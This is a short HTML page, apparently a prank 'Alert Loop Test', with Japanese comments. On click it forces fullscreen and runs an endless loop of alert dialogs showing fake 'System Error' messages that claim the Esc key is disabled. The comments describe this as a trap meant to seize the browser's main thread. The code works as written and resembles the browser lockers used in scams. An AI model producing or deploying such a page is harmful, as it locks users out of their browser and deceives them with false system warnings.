<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>Alert Loop Test</title>
    <style>
        body {
            margin: 0;
            background-color: #000;
            color: #0ff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: monospace;
            cursor: pointer;
            user-select: none;
        }
        h1 {
            font-size: 3rem;
            text-shadow: 0 0 10px #0ff;
        }
    </style>
</head>
<body>

    <h1>CLICK TO START</h1>

    <script>
        document.body.addEventListener('click', async () => {
            try {
                // フルスクリーン化を試みる
                await document.documentElement.requestFullscreen();
            } catch (err) {
                console.log(err);
            }

            // メインスレッドの制御権を完全に奪い去る無限アラートの罠
            // ブラウザや環境によっては「このページがこれ以上ダイアログを表示するのを防ぐ」にチェックを入れないと地獄になります
            let count = 1;
            while (true) {
                alert(`System Error #${count}: Escキーが無効化されました。`);
                count++;
            }
        });
    </script>

</body>
</html>
